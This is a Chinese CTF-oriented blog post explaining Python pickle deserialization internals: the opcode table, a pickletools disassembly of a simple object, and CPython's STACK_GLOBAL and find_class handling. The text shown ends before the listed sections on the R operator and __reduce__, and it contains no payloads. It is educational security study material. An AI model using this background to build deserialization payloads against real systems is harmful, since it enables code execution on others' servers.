<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Pickle 反序列化 我的世界有一个咒法学模组，也是栈编程，很有意思，有兴趣可以试一试，如果很难理解栈编程的话玩一下就完全明白了 :P  pickle是一种栈语言，它有不同的编写方式，基于轻量级的 PVM（Pickle Virtual Machine）。  指令处理器： 指令处理器从流中读取操作码（opcode）和参数，并对其进行解释处理。重复这个动作，直到遇到结束符号 . 后停止。最终留在栈顶">
<meta property="og:type" content="article">
<meta property="og:title" content="Python_pickle反序列化">
<meta property="og:url" content="http://example.com/2024/08/20/Python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
<meta property="og:site_name" content="oSthing&#39;s Blog">
<meta property="og:description" content="Pickle 反序列化 我的世界有一个咒法学模组，也是栈编程，很有意思，有兴趣可以试一试，如果很难理解栈编程的话玩一下就完全明白了 :P  pickle是一种栈语言，它有不同的编写方式，基于轻量级的 PVM（Pickle Virtual Machine）。  指令处理器： 指令处理器从流中读取操作码（opcode）和参数，并对其进行解释处理。重复这个动作，直到遇到结束符号 . 后停止。最终留在栈顶">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-08-20T08:08:14.000Z">
<meta property="article:modified_time" content="2024-08-20T08:09:10.021Z">
<meta property="article:author" content="oSthing">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="python">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Python_pickle反序列化</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/oSthing">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/08/20/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/08/20/Python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/08/20/Python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=Python_pickle反序列化"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/08/20/Python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Python_pickle反序列化"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/08/20/Python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=Python_pickle反序列化"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Python_pickle反序列化&body=Check out this article: http://example.com/2024/08/20/Python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/08/20/Python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Python_pickle反序列化"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/08/20/Python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Python_pickle反序列化"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/08/20/Python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Python_pickle反序列化"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/08/20/Python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Python_pickle反序列化"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/08/20/Python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=Python_pickle反序列化&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/08/20/Python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=Python_pickle反序列化"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">Pickle 反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%9F%E8%BF%9B%E8%B0%83%E8%AF%95"><span class="toc-number">1.1.</span> <span class="toc-text">跟进调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pickletools"><span class="toc-number">1.1.1.</span> <span class="toc-text">pickletools</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pickle%E6%9E%84%E9%80%A0"><span class="toc-number">1.2.</span> <span class="toc-text">pickle构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%93%8D%E4%BD%9C%E7%A0%81%E6%9E%84%E9%80%A0"><span class="toc-number">1.2.1.</span> <span class="toc-text">常见操作码构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#o%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-number">1.2.2.</span> <span class="toc-text">o操作符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#i%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-number">1.2.3.</span> <span class="toc-text">i操作符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#R%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-number">1.2.4.</span> <span class="toc-text">R操作符</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#reduce-%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">__reduce__方法</span></a></li></ol></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Python_pickle反序列化
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">oSthing</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-08-20T08:08:14.000Z" class="dt-published" itemprop="datePublished">2024-08-20</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/ctf/" rel="tag">ctf</a>, <a class="p-category" href="/tags/python/" rel="tag">python</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="Pickle-反序列化"><a href="#Pickle-反序列化" class="headerlink" title="Pickle 反序列化"></a>Pickle 反序列化</h1><blockquote>
<p>我的世界有一个咒法学模组，也是栈编程，很有意思，有兴趣可以试一试，如果很难理解栈编程的话玩一下就完全明白了 :P</p>
</blockquote>
<p><code>pickle</code>是一种栈语言，它有不同的编写方式，基于轻量级的 PVM（Pickle Virtual Machine）。</p>
<ul>
<li><p><strong>指令处理器：</strong></p>
<p>指令处理器从流中读取操作码（opcode）和参数，并对其进行解释处理。重复这个动作，直到遇到结束符号 <code>.</code> 后停止。最终留在栈顶的值将被作为反序列化对象返回。</p>
</li>
<li><p><strong>栈（Stack）：</strong></p>
<p>采用 Python 的列表实现，用于临时存储数据、参数以及对象。</p>
</li>
<li><p><strong>记忆（Memo）：</strong></p>
<p>使用 Python 的字典实现，为 PVM 的整个生命周期提供存储。</p>
</li>
</ul>
<p><code>pickle</code> 模块实现了对 Python 对象结构的二进制序列化和反序列化。</p>
<p><code>pickle</code> 主要包含四个方法，简要描述如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pickle.dump(obj, file)  <span class="comment"># 将 obj 对象进行序列化并写入到 file 文件中，需要以二进制写入模式（&#x27;wb&#x27;）打开 file。</span></span><br><span class="line">pickle.load(file)  <span class="comment"># 从 file 文件中反序列化对象，需要以二进制读取模式（&#x27;rb&#x27;）打开 file。</span></span><br><span class="line">pickle.dumps(obj)  <span class="comment"># 将 obj 对象进行序列化并返回其字节表示。</span></span><br><span class="line">pickle.loads(data)  <span class="comment"># 反序列化 data（字节类对象）并返回相应的对象。</span></span><br></pre></td></tr></table></figure>

<p><code>dump</code> 和 <code>load</code> 方法类似于 PHP 的 <code>serialize</code> 和 <code>unserialize</code>。</p>
<p>了解更多详情，请参阅<a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/pickle.html">官方文档</a>。</p>
<p>实际上，<code>pickle</code> 可以看作一种独立的语言，通过编写操作码（opcode）可以执行 Python 代码、覆盖变量等操作。直接编写操作码的灵活性高于使用 <code>pickle</code> 序列化生成的代码。</p>
<p>下面是基本的pickle的操作码(opcode)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">MARK           = <span class="string">b&#x27;(&#x27;</span>   <span class="comment"># 在栈上推送特殊的标记对象</span></span><br><span class="line">STOP           = <span class="string">b&#x27;.&#x27;</span>   <span class="comment"># 每个 pickle 都以 STOP 结束</span></span><br><span class="line">POP            = <span class="string">b&#x27;0&#x27;</span>   <span class="comment"># 弹出栈顶元素</span></span><br><span class="line">POP_MARK       = <span class="string">b&#x27;1&#x27;</span>   <span class="comment"># 弹出从栈顶到最上面的标记对象</span></span><br><span class="line">DUP            = <span class="string">b&#x27;2&#x27;</span>   <span class="comment"># 复制栈顶元素</span></span><br><span class="line">FLOAT          = <span class="string">b&#x27;F&#x27;</span>   <span class="comment"># 推送浮点数对象；十进制字符串参数</span></span><br><span class="line">INT            = <span class="string">b&#x27;I&#x27;</span>   <span class="comment"># 推送整数或布尔值；十进制字符串参数</span></span><br><span class="line">BININT         = <span class="string">b&#x27;J&#x27;</span>   <span class="comment"># 推送四字节有符号整数</span></span><br><span class="line">BININT1        = <span class="string">b&#x27;K&#x27;</span>   <span class="comment"># 推送一字节无符号整数</span></span><br><span class="line">LONG           = <span class="string">b&#x27;L&#x27;</span>   <span class="comment"># 推送长整数；十进制字符串参数</span></span><br><span class="line">BININT2        = <span class="string">b&#x27;M&#x27;</span>   <span class="comment"># 推送二字节无符号整数</span></span><br><span class="line">NONE           = <span class="string">b&#x27;N&#x27;</span>   <span class="comment"># 推送 None</span></span><br><span class="line">PERSID         = <span class="string">b&#x27;P&#x27;</span>   <span class="comment"># 推送持久对象；ID 取自字符串参数</span></span><br><span class="line">BINPERSID      = <span class="string">b&#x27;Q&#x27;</span>   <span class="comment"># 推送持久对象；ID 取自栈上的字符串参数</span></span><br><span class="line">REDUCE         = <span class="string">b&#x27;R&#x27;</span>   <span class="comment"># 对栈上的参数元组应用可调用对象</span></span><br><span class="line">STRING         = <span class="string">b&#x27;S&#x27;</span>   <span class="comment"># 推送字符串；以 NL 结尾的字符串参数</span></span><br><span class="line">BINSTRING      = <span class="string">b&#x27;T&#x27;</span>   <span class="comment"># 推送字符串；计数二进制字符串参数</span></span><br><span class="line">SHORT_BINSTRING= <span class="string">b&#x27;U&#x27;</span>   <span class="comment"># 推送字符串；计数二进制字符串参数，长度 &lt; 256 字节</span></span><br><span class="line">UNICODE        = <span class="string">b&#x27;V&#x27;</span>   <span class="comment"># 推送 Unicode 字符串；原始 Unicode 转义的参数</span></span><br><span class="line">BINUNICODE     = <span class="string">b&#x27;X&#x27;</span>   <span class="comment"># 推送字符串；计数 UTF-8 字符串参数</span></span><br><span class="line">APPEND         = <span class="string">b&#x27;a&#x27;</span>   <span class="comment"># 将栈顶元素附加到其下的列表</span></span><br><span class="line">BUILD          = <span class="string">b&#x27;b&#x27;</span>   <span class="comment"># 调用 __setstate__ 或 __dict__.update()</span></span><br><span class="line">GLOBAL         = <span class="string">b&#x27;c&#x27;</span>   <span class="comment"># 推送 self.find_class(modname, name)；两个字符串参数</span></span><br><span class="line">DICT           = <span class="string">b&#x27;d&#x27;</span>   <span class="comment"># 从栈项构建字典</span></span><br><span class="line">EMPTY_DICT     = <span class="string">b&#x27;&#125;&#x27;</span>   <span class="comment"># 推送空字典</span></span><br><span class="line">APPENDS        = <span class="string">b&#x27;e&#x27;</span>   <span class="comment"># 通过栈上的最上面的切片扩展栈上的列表</span></span><br><span class="line">GET            = <span class="string">b&#x27;g&#x27;</span>   <span class="comment"># 从备忘录推送项目到栈上；索引为字符串参数</span></span><br><span class="line">BINGET         = <span class="string">b&#x27;h&#x27;</span>   <span class="comment"># 从备忘录推送项目到栈上；索引为一字节参数</span></span><br><span class="line">INST           = <span class="string">b&#x27;i&#x27;</span>   <span class="comment"># 构建并推送类实例</span></span><br><span class="line">LONG_BINGET    = <span class="string">b&#x27;j&#x27;</span>   <span class="comment"># 从备忘录推送项目到栈上；索引为四字节参数</span></span><br><span class="line">LIST           = <span class="string">b&#x27;l&#x27;</span>   <span class="comment"># 从栈上的最上面的项构建列表</span></span><br><span class="line">EMPTY_LIST     = <span class="string">b&#x27;]&#x27;</span>   <span class="comment"># 推送空列表</span></span><br><span class="line">OBJ            = <span class="string">b&#x27;o&#x27;</span>   <span class="comment"># 构建并推送类实例</span></span><br><span class="line">PUT            = <span class="string">b&#x27;p&#x27;</span>   <span class="comment"># 将栈顶元素存储在备忘录中；索引为字符串参数</span></span><br><span class="line">BINPUT         = <span class="string">b&#x27;q&#x27;</span>   <span class="comment"># 将栈顶元素存储在备忘录中；索引为一字节参数</span></span><br><span class="line">LONG_BINPUT    = <span class="string">b&#x27;r&#x27;</span>   <span class="comment"># 将栈顶元素存储在备忘录中；索引为四字节参数</span></span><br><span class="line">SETITEM        = <span class="string">b&#x27;s&#x27;</span>   <span class="comment"># 向字典添加键值对</span></span><br><span class="line">TUPLE          = <span class="string">b&#x27;t&#x27;</span>   <span class="comment"># 从栈上的最上面的项构建元组</span></span><br><span class="line">EMPTY_TUPLE    = <span class="string">b&#x27;)&#x27;</span>   <span class="comment"># 推送空元组</span></span><br><span class="line">SETITEMS       = <span class="string">b&#x27;u&#x27;</span>   <span class="comment"># 通过添加栈上的最上面的键值对修改字典</span></span><br><span class="line">BINFLOAT       = <span class="string">b&#x27;G&#x27;</span>   <span class="comment"># 推送浮点数；参数为 8 字节浮点数编码</span></span><br><span class="line"></span><br><span class="line">TRUE           = <span class="string">b&#x27;I01\n&#x27;</span>  <span class="comment"># 不是操作码；参见 pickletools.py 中的 INT 文档</span></span><br><span class="line">FALSE          = <span class="string">b&#x27;I00\n&#x27;</span>  <span class="comment"># 不是操作码；参见 pickletools.py 中的 INT 文档</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 协议 2</span></span><br><span class="line"></span><br><span class="line">PROTO          = <span class="string">b&#x27;\x80&#x27;</span>  <span class="comment"># 标识 pickle 协议</span></span><br><span class="line">NEWOBJ         = <span class="string">b&#x27;\x81&#x27;</span>  <span class="comment"># 通过将 cls.__new__ 应用于参数元组构建对象</span></span><br><span class="line">EXT1           = <span class="string">b&#x27;\x82&#x27;</span>  <span class="comment"># 从扩展注册表推送对象；一字节索引</span></span><br><span class="line">EXT2           = <span class="string">b&#x27;\x83&#x27;</span>  <span class="comment"># 同上，但是二字节索引</span></span><br><span class="line">EXT4           = <span class="string">b&#x27;\x84&#x27;</span>  <span class="comment"># 同上，但是四字节索引</span></span><br><span class="line">TUPLE1         = <span class="string">b&#x27;\x85&#x27;</span>  <span class="comment"># 从栈顶构建一个元组</span></span><br><span class="line">TUPLE2         = <span class="string">b&#x27;\x86&#x27;</span>  <span class="comment"># 从两个最上面的栈项构建一个二元组</span></span><br><span class="line">TUPLE3         = <span class="string">b&#x27;\x87&#x27;</span>  <span class="comment"># 从三个最上面的栈项构建一个三元组</span></span><br><span class="line">NEWTRUE        = <span class="string">b&#x27;\x88&#x27;</span>  <span class="comment"># 推送 True</span></span><br><span class="line">NEWFALSE       = <span class="string">b&#x27;\x89&#x27;</span>  <span class="comment"># 推送 False</span></span><br><span class="line">LONG1          = <span class="string">b&#x27;\x8a&#x27;</span>  <span class="comment"># 从长度 &lt; 256 字节的字符串推送长整数</span></span><br><span class="line">LONG4          = <span class="string">b&#x27;\x8b&#x27;</span>  <span class="comment"># 推送非常大的长整数</span></span><br><span class="line"></span><br><span class="line">_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 协议 3 (Python 3.x)</span></span><br><span class="line"></span><br><span class="line">BINBYTES       = <span class="string">b&#x27;B&#x27;</span>   <span class="comment"># 推送字节；计数二进制字符串参数</span></span><br><span class="line">SHORT_BINBYTES = <span class="string">b&#x27;C&#x27;</span>   <span class="comment"># 推送字节；计数二进制字符串参数，长度 &lt; 256 字节</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 协议 4</span></span><br><span class="line"></span><br><span class="line">SHORT_BINUNICODE = <span class="string">b&#x27;\x8c&#x27;</span>  <span class="comment"># 推送短字符串；UTF-8 长度 &lt; 256 字节</span></span><br><span class="line">BINUNICODE8      = <span class="string">b&#x27;\x8d&#x27;</span>  <span class="comment"># 推送非常长的字符串</span></span><br><span class="line">BINBYTES8        = <span class="string">b&#x27;\x8e&#x27;</span>  <span class="comment"># 推送非常长的字节字符串</span></span><br><span class="line">EMPTY_SET        = <span class="string">b&#x27;\x8f&#x27;</span>  <span class="comment"># 在栈上推送空集合</span></span><br><span class="line">ADDITEMS         = <span class="string">b&#x27;\x90&#x27;</span>  <span class="comment"># 通过添加栈上最上面的项修改集合</span></span><br><span class="line">FROZENSET        = <span class="string">b&#x27;\x91&#x27;</span>  <span class="comment"># 从栈上最上面的项构建 frozenset</span></span><br><span class="line">NEWOBJ_EX        = <span class="string">b&#x27;\x92&#x27;</span>  <span class="comment"># 类似 NEWOBJ，但是适用于仅关键字参数</span></span><br><span class="line">STACK_GLOBAL     = <span class="string">b&#x27;\x93&#x27;</span>  <span class="comment"># 与 GLOBAL 相同，但是使用栈上的名称</span></span><br><span class="line">MEMOIZE          = <span class="string">b&#x27;\x94&#x27;</span>  <span class="comment"># 在备忘录中存储栈顶元素</span></span><br><span class="line">FRAME            = <span class="string">b&#x27;\x95&#x27;</span>  <span class="comment"># 表示新帧的开始</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 协议 5</span></span><br><span class="line"></span><br><span class="line">BYTEARRAY8       = <span class="string">b&#x27;\x96&#x27;</span>  <span class="comment"># 推送 bytearray</span></span><br><span class="line">NEXT_BUFFER      = <span class="string">b&#x27;\x97&#x27;</span>  <span class="comment"># 推送下一个带外缓冲区</span></span><br><span class="line">READONLY_BUFFER  = <span class="string">b&#x27;\x98&#x27;</span>  <span class="comment"># 将栈顶设为只读</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>就这么看着还是很难懂，最直观的方法就是跟进调试一下</p>
<h2 id="跟进调试"><a href="#跟进调试" class="headerlink" title="跟进调试"></a>跟进调试</h2><h3 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a>pickletools</h3><p>pickletools可以将opcode指令转变成直观的操作码的形式</p>
<p>测试代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>.x = <span class="number">1</span></span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(pickletools.dis(pickle.dumps(a)))</span><br></pre></td></tr></table></figure>

<p>run一下得到下面</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">0</span>: \x80 PROTO      <span class="number">4</span></span><br><span class="line"> <span class="number">2</span>: \x95 FRAME      <span class="number">31</span></span><br><span class="line"><span class="number">11</span>: \x8c SHORT_BINUNICODE <span class="string">&#x27;__main__&#x27;</span></span><br><span class="line"><span class="number">21</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">0</span>)</span><br><span class="line"><span class="number">22</span>: \x8c SHORT_BINUNICODE <span class="string">&#x27;A&#x27;</span></span><br><span class="line"><span class="number">25</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">1</span>)</span><br><span class="line"><span class="number">26</span>: \x93 STACK_GLOBAL</span><br><span class="line"><span class="number">27</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">2</span>)</span><br><span class="line"><span class="number">28</span>: )       EMPTY_TUPLE</span><br><span class="line"><span class="number">29</span>: \x81 NEWOBJ</span><br><span class="line"><span class="number">30</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">3</span>)</span><br><span class="line"><span class="number">31</span>: &#125;       EMPTY_DICT</span><br><span class="line"><span class="number">32</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">4</span>)</span><br><span class="line"><span class="number">33</span>: \x8c SHORT_BINUNICODE <span class="string">&#x27;x&#x27;</span></span><br><span class="line"><span class="number">36</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">5</span>)</span><br><span class="line"><span class="number">37</span>: K      BININT1    <span class="number">1</span></span><br><span class="line"><span class="number">39</span>: s       SETITEM</span><br><span class="line"><span class="number">40</span>: b      BUILD</span><br><span class="line"><span class="number">41</span>: .        STOP</span><br></pre></td></tr></table></figure>

<p>第一个 <code>PROTO</code>(\x80) 标识 pickle 协议,后面跟着版本号 4</p>
<p><code>FRAME</code>(\x95) 表示新帧的开始 后面31代表后面的31位指令都是这个新帧</p>
<p><code>SHORT_BINUNICODE</code>(\x8c) 推送短字符串 ‘<code>__main__</code>‘</p>
<p><code>MEMOIZE</code>(\x94) 压到栈顶 ，目前是第0个</p>
<p>\x8c 推送短字符串 ‘A’</p>
<p>\x94 压栈</p>
<p>重要的指令来了 STACK_GLOBAL(\x93) 和global相同，我们跟进看一下相关类</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_stack_global</span>(<span class="params">self</span>):</span><br><span class="line">    name = <span class="variable language_">self</span>.stack.pop()</span><br><span class="line">    module = <span class="variable language_">self</span>.stack.pop()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(name) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">str</span> <span class="keyword">or</span> <span class="built_in">type</span>(module) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">raise</span> UnpicklingError(<span class="string">&quot;STACK_GLOBAL requires str&quot;</span>)</span><br><span class="line">    <span class="variable language_">self</span>.append(<span class="variable language_">self</span>.find_class(module, name))</span><br><span class="line">dispatch[STACK_GLOBAL[<span class="number">0</span>]] = load_stack_global</span><br></pre></td></tr></table></figure>

<p>弹出名字和模块名传给<code>find_class</code></p>
<p>传入两个参数 modname 模块名 name 名字,根据上面的栈来看，我们传入了<code>modname =&#39;__main__&#39;</code>、<code>name=A</code></p>
<p>我们找一下<code>find_class</code>，进<code>pickle.loads</code>里面的类库看一下</p>
